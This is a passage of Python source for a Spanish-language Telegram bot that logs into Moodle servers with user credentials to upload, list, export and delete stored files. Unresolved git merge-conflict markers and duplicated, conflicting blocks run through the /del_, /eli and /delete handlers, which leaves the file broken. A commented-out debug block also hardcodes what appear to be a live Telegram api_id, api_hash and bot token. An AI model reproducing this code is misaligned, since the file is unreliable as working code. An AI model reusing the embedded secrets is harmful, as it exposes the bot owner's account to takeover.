            start_msg = '<b>💻Bot: Subida Moodle</b>\n'
            start_msg+= '<b>📭Master: @Cesar1269</b>\n'
            start_msg+= '<b>📌Guia: </b> <a href="https://nube.reduc.edu.cu/index.php/s/L9WMzC56ZgTZo6b/download/Tutorial%20R%C3%A1pido%20.mp4">AQUI</a>\n'
            start_msg+= '<b>🚨Uso: Envia Enlaces De Descarga y Archivos Para Procesar (Configure Antes De Empezar , Vea El /tutorial)</b>\n'
            bot.editMessageText(message,start_msg,parse_mode='html')
        elif '/gettoken' in msgText:
            message2 = bot.editMessageText(message,'Obteniendo Token...')
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            try:
                proxy = ProxyCloud.parse(user_info['proxy'])
                client = MoodleClient(user_info['moodle_user'],
                                      user_info['moodle_password'],
                                      user_info['moodle_host'],
                                      user_info['moodle_repo_id'],proxy=proxy)
                loged = client.login()
                if loged:
                    token = client.userdata
                    modif = token['token']
                    bot.editMessageText(message2,'Su Token es: '+modif)
                    client.logout()
                else:
                    bot.editMessageText(message2,'La Moodle '+client.path+' No tiene Token')
            except Exception as ex:
                bot.editMessageText(message2,'La Moodle '+client.path+' No tiene Token o revise la Cuenta')
        elif '/files' == msgText and user_info['cloudtype']=='moodle':
             proxy = ProxyCloud.parse(user_info['proxy'])
             client = MoodleClient(user_info['moodle_user'],
                                   user_info['moodle_password'],
                                   user_info['moodle_host'],
                                   user_info['moodle_repo_id'],proxy=proxy)
             loged = client.login()
             if loged:
                 files = client.getEvidences()
                 filesInfo = infos.createFilesMsg(files)
                 bot.editMessageText(message,filesInfo)
                 client.logout()
             else:
                bot.editMessageText(message,'❌Error y Causas🧐\n1-Revise su Cuenta\n2-Servidor Desabilitado: '+client.path)
        elif '/txt_' in msgText and user_info['cloudtype']=='moodle':
             findex = str(msgText).split('_')[1]
             findex = int(findex)
             proxy = ProxyCloud.parse(user_info['proxy'])
             client = MoodleClient(user_info['moodle_user'],
                                   user_info['moodle_password'],
                                   user_info['moodle_host'],
                                   user_info['moodle_repo_id'],proxy=proxy)
             loged = client.login()
             if loged:
                 evidences = client.getEvidences()
                 evindex = evidences[findex]
                 txtname = evindex['name']+'.txt'
                 sendTxt(txtname,evindex['files'],update,bot)
                 client.logout()
                 bot.editMessageText(message,'TxT Aqui👇')
             else:
                bot.editMessageText(message,'❌Error y Causas🧐\n1-Revise su Cuenta\n2-Servidor Desabilitado: '+client.path)
             pass
        elif '/del_' in msgText and user_info['cloudtype']=='moodle':
            findex = int(str(msgText).split('_')[1])
<<<<<<< HEAD
=======
            proxy = ProxyCloud.parse(user_info['proxy'])
            client = MoodleClient(user_info['moodle_user'],
                                   user_info['moodle_password'],
                                   user_info['moodle_host'],
                                   user_info['moodle_repo_id'],
                                   proxy=proxy)
            loged = client.login()
            if loged:
                evfile = client.getEvidences()[findex]
                client.deleteEvidence(evfile)
                client.logout()
                bot.editMessageText(message,'Archivo Borrado 🦶')
            else:
                bot.editMessageText(message,'❌Error y Causas🧐\n1-Revise su Cuenta\n2-Servidor Desabilitado: '+client.path)
        elif '/eli' in msgText and user_info['cloudtype']=='moodle':
            contador = 0
            eliminados = 0
            bot.editMessageText(message,'Eliminando los 50 Primero Elementos...')
            proxy = ProxyCloud.parse(user_info['proxy'])
            client = MoodleClient(user_info['moodle_user'],
                                user_info['moodle_password'],
                                user_info['moodle_host'],
                                user_info['moodle_repo_id'],
                                proxy=proxy)
            loged = client.login()
            prueba = client.getEvidences()
            if len(prueba) == 0:
                bot.sendMessage(update.message.chat.id,'La Moodle está vacia')
                return 
            try:
                for contador in range(50):
                    proxy = ProxyCloud.parse(user_info['proxy'])
                    client = MoodleClient(user_info['moodle_user'],
                                    user_info['moodle_password'],
                                    user_info['moodle_host'],
                                    user_info['moodle_repo_id'],
                                    proxy=proxy)
                    loged = client.login()
                    if loged:               
                            evfile = client.getEvidences()[0]
                            client.deleteEvidence(evfile)
                            eliminados += 1
                            bot.sendMessage(update.message.chat.id,'Archivo ' +str(eliminados)+' Borrado 🦶')                            
                    else:
                        bot.sendMessage(update.message.chat.id,'❌Error y Causas🧐\n1-Revise su Cuenta\n2-Servidor Desabilitado: '+client.path)
                bot.sendMessage(update.message.chat.id,'Se eliminaron Completamente los  50 Elementos')
            except:
                bot.sendMessage(update.message.chat.id,'No se pudieron eliminar 50 elementos solo se eliminaron '+str(eliminados))
        elif '/delete' in msgText:
            enlace = msgText.split('/delete')[-1]
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
            proxy = ProxyCloud.parse(user_info['proxy'])
            client = MoodleClient(user_info['moodle_user'],
                                   user_info['moodle_password'],
                                   user_info['moodle_host'],
                                   user_info['moodle_repo_id'],
                                   proxy=proxy)
            loged = client.login()
            if loged:
<<<<<<< HEAD
                evfile = client.getEvidences()[findex]
                client.deleteEvidence(evfile)
                client.logout()
                bot.editMessageText(message,'Archivo Borrado 🦶')
            else:
                bot.editMessageText(message,'❌Error y Causas🧐\n1-Revise su Cuenta\n2-Servidor Desabilitado: '+client.path)
        elif '/eli' in msgText and user_info['cloudtype']=='moodle':
            contador = 0
            eliminados = 0
            bot.editMessageText(message,'Eliminando los 50 Primero Elementos...')
            proxy = ProxyCloud.parse(user_info['proxy'])
            client = MoodleClient(user_info['moodle_user'],
                                user_info['moodle_password'],
                                user_info['moodle_host'],
                                user_info['moodle_repo_id'],
                                proxy=proxy)
            loged = client.login()
            prueba = client.getEvidences()
            if len(prueba) == 0:
                bot.sendMessage(update.message.chat.id,'La Moodle está vacia')
                return 
            try:
                for contador in range(50):
                    proxy = ProxyCloud.parse(user_info['proxy'])
                    client = MoodleClient(user_info['moodle_user'],
                                    user_info['moodle_password'],
                                    user_info['moodle_host'],
                                    user_info['moodle_repo_id'],
                                    proxy=proxy)
                    loged = client.login()
                    if loged:               
                            evfile = client.getEvidences()[0]
                            client.deleteEvidence(evfile)
                            eliminados += 1
                            bot.sendMessage(update.message.chat.id,'Archivo ' +str(eliminados)+' Borrado 🦶')                            
                    else:
                        bot.sendMessage(update.message.chat.id,'❌Error y Causas🧐\n1-Revise su Cuenta\n2-Servidor Desabilitado: '+client.path)
                bot.sendMessage(update.message.chat.id,'Se eliminaron Completamente los  50 Elementos')
            except:
                bot.sendMessage(update.message.chat.id,'No se pudieron eliminar 50 elementos solo se eliminaron '+str(eliminados))
=======
                # update.message.chat.id
                deleted = client.delete(enlace)
                if deleted:
                    bot.editMessageText(message, "Archivo eliminado con exito...")
                else:
                    bot.editMessageText(message, "Archivo no pudo ser eliminado... revice la url o su cuenta")
            else:
                bot.editMessageText(message, "Archivo no pudo ser eliminado... revice la url o su cuenta")
>>>>>>> 5933c34322f9c94eaf53e2847818a081f3582bea
        elif 'http' in msgText:
            url = msgText
            ddl(update,bot,message,url,file_name='',thread=thread,jdb=jdb)
        else:
            #if update:
            #    api_id = os.environ.get('api_id')
            #    api_hash = os.environ.get('api_hash')
            #    bot_token = os.environ.get('bot_token')
            #    
                # set in debug
            #    api_id = 7386053
            #    api_hash = '78d1c032f3aa546ff5176d9ff0e7f341'
            #    bot_token = '5124841893:AAH30p6ljtIzi2oPlaZwBmCfWQ1KelC6KUg'

            #    chat_id = int(update.message.chat.id)
            #    message_id = int(update.message.message_id)
            #    import asyncio
            #    asyncio.run(tlmedia.download_media(api_id,api_hash,bot_token,chat_id,message_id))
            #    return
            bot.editMessageText(message,'😵No se pudo procesar😵')
    except Exception as ex:
           print(str(ex))
           bot.sendMessage(update.message.chat.id,str(ex))

def cancel_task(update,bot:ObigramClient):
    try:
        cmd = str(update.data).split(' ', 2)
        tid = cmd[1]
        tcancel = bot.threads[tid]
        msg = tcancel.getStore('msg')
        tcancel.store('stop', True)
        time.sleep(3)
        bot.deleteMessage(update.message)
    except Exception as ex:
        print(str(ex))
    return
    pass

def maketxt(update,bot:ObigramClient):
    data = update.message.reply_markup.inline_keyboard
    urls = []
    for item in data:
        for keyboard in item:
            try:
                name = keyboard.text
                url = keyboard.url
                urls.append({'name':name,'directurl':url})
            except:pass
    txtname = str(update.data).replace(' ','')
    sendTxt(txtname,urls,update,bot)
    pass

def deleteproxy(update,bot:ObigramClient):
    username = update.data
    jdb = JsonDatabase('database')
    jdb.check_create()
    jdb.load()
    userdata = jdb.get_user(username)
    if userdata:
        userdata['proxy'] = ''
        jdb.save_data_user(username, userdata)
        jdb.save()
        statInfo = infos.createStat(username, userdata, jdb.is_admin(username))
        bot.editMessageText(update.message, statInfo)
    pass

def convert2calendar(update,bot:ObigramClient):
    data = update.message.reply_markup.inline_keyboard
    urls = []
    for item in data:
        for keyboard in item:
            try:
                name = keyboard.text
                url = keyboard.url
                urls.append(url)
            except:
                pass
    parserdata = S5Crypto.decrypt(str(update.message.text).split('\n')[1].replace('datacallback: ','')).split('|')
    parser = Draft2Calendar()
    host = parserdata[0]
    user = parserdata[1]
    passw = parserdata[2]
    proxy = None
    if len(parserdata)>3:
        proxy = ProxyCloud.parse(parserdata[3])
    asyncio.run(parser.send_calendar(host,user,passw,urls,proxy))
    while parser.status==0:pass
    if parser.data:
        text = str(update.message.text).replace('draft','calendario')
        markup_array = []
        i = 0
        lastfile = ''
        while i < len(parser.data):
            filename1 = str(parser.data[i]).split('/')[-1]
            bbt = [inlineKeyboardButton(filename1, url=parser.data[i])]
            lastfile = filename1
            if i + 1 < len(parser.data):
                filename2 = str(parser.data[i + 1]).split('/')[-1]
                if filename2!=lastfile:
                    bbt.append(inlineKeyboardButton(filename2, url=parser.data[i + 1]))
                    lastfile = filename2
            markup_array.append(bbt)
            i += 2
        txtname = str(parser.data[0]).split('/')[-1].split('.')[0] + '.txt'
        markup_array.append([inlineKeyboardButton('✎Crear TxT✎',callback_data='/maketxt '+txtname)])
        reply_markup = inlineKeyboardMarkupArray(markup_array)
        bot.editMessageText(update.message, text,reply_markup=reply_markup)
    pass

def main():
    bot_token = os.environ.get('bot_token')
    print('init bot.')
    #set in debug
    bot = ObigramClient(bot_token)
    bot.onMessage(onmessage)
    bot.onCallbackData('/cancel ',cancel_task)
    bot.onCallbackData('/maketxt ', maketxt)
    bot.onCallbackData('/deleteproxy ',deleteproxy)
    bot.onCallbackData('/convert2calendar ',convert2calendar)
    bot.run()

if __name__ == '__main__':
    try:
        main()
    except:
        main()